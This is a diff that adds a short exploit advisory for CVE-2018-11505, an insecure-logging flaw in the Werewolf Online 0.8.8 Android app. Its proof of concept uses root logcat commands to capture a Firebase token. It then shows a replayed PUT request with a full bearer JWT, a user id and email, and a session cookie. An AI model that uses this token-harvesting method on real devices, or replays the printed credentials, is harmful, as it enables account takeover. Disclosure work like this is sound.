@@ -1,0 +1,56 @@
+# Exploit Title: Werewolf Online 0.8.8  - Insecure Logging
+# Date: 2018-05-24
+# Software Link:
+https://play.google.com/store/apps/details?id=com.werewolfapps.online
+# Download Link:
+https://apkpure.com/werewolf-online-unreleased/com.werewolfapps.online/download?from=details
+# Exploit Author: ManhNho
+# Version: 0.8.8 Android App
+# CVE: CVE-2018-11505
+# Category: Mobile Apps
+# Tested on: Android 4.4
+
+---Description---
+
+Many developers log information to the android log. Sometimes sensitive
+data as well.
+With output of logcat, Hacker can get "Firebase token" which used in PUT
+request to /players/meAndCheckAppVersion
+
+---PoC---
+
+root@vbox86p:/ # ps | grep 'were'
+u0_a72    9161  205   810364 172268 ffffffff b765ea23 S
+com.werewolfapps.online
+root@vbox86p:/ # logcat | grep -i '9161'
+I/ActivityManager(  586): Start proc com.werewolfapps.online for activity
+com.werewolfapps.online/.MainActivity: pid=9161 uid=10072 gids={50072,
+3003, 1028, 1015}
+I/MultiDex( 9161): VM with version 1.6.0 does not have multidex support
+I/MultiDex( 9161): Installing application
+...
+D/RNFirebaseMessaging( 9161): Firebase token:
+dygrGiSN49o:APA91bGGcHdzgU_2SnDydd8R7_Lbj6KT7miTpBatk_j8pLhxgH9vX00vV3CuIEnVkqgK9HC8H9pldMeaUeJ2_H3Dz4QiXE0b3mlQA0lXvry6cAMwS77Jv3m6NJyuGu_7Hn-3E1BPRRh8
+D/RNFirebaseAuth( 9161): getToken/getIdToken
+D/RNFirebaseAuth( 9161): getToken:onComplete:success
+...
+
+Request:
+
+PUT /players/meAndCheckAppVersion HTTP/1.1
+authorization: Bearer
+eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMDUwYzMxN2ExMjJlZDhlMWZlODdkN2FhZTdlMzk3OTBmNmMwYjQifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vd2VyZXdvbGYtb25saW5lLTE5MTgxMiIsImF1ZCI6IndlcmV3b2xmLW9ubGluZS0xOTE4MTIiLCJhdXRoX3RpbWUiOjE1MjcxMzU0MTUsInVzZXJfaWQiOiIzNUxUT2pGWGw4Tk1DMklURDZlc1VUdVZ0RDgyIiwic3ViIjoiMzVMVE9qRlhsOE5NQzJJVEQ2ZXNVVHVWdEQ4MiIsImlhdCI6MTUyNzEzNTQxNSwiZXhwIjoxNTI3MTM5MDE1LCJlbWFpbCI6IndlcmVAMGlscy5vcmciLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZW1haWwiOlsid2VyZUAwaWxzLm9yZyJdfSwic2lnbl9pbl9wcm92aWRlciI6InBhc3N3b3JkIn19.dRcMrVgnOI0VlVMTinv_UitmNZ3Lx6MxWQkPbxrLtj4xNI-5TmqL-oMHA3M4wWxt6gCtvNl9aO10WzhHHaN5wSJ7cnuUkEJGNUmA5PUcQTR7-NJ8i28C_x7fkqbQYqr0LFJSNxfa3BNb6B8qRNPmNjf_k3KoarRtp2eIxXbY_2Zf9S9-E8qBeyMM5waBrc3KHhxP8fIkxmDQOcTi83YioD0B9lmb8pqzu2kHARhySDIRLxHehujSMbOBnwEdSWNdYXv3G0r9SSJqREjyjv-xYqMzmDYElQ71LcanaoKeHmyyEDnuKyctkyvOOKUARV5QF1eMvvS2jQXlHQUIr2slHw
+Content-Type: application/json; charset=utf-8
+Content-Length: 207
+Host: api-core.werewolf-apps.com
+Connection: close
+Accept-Encoding: gzip, deflate
+Cookie:
+AWSELB=896D69710664CD95B9C2256646A1D3D31F91AA414E0FCA5064E93F2745A17C7AAAF7C2EDA090955CDC20408E213D8C06ACC71A484F0BB3CDD1FB3D4FADD3439C18EF311AB3
+User-Agent: okhttp/3.6.0
+
+{"versionNumber":48,"platform":"android","fcmToken":"dygrGiSN49o:APA91bGGcHdzgU_2SnDydd8R7_Lbj6KT7miTpBatk_j8pLhxgH9vX00vV3CuIEnVkqgK9HC8H9pldMeaUeJ2_H3Dz4QiXE0b3mlQA0lXvry6cAMwS77Jv3m6NJyuGu_7Hn-3E1BPRRh8"}
+
+---References---
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11505
+https://pastebin.com/NtPn3jB8
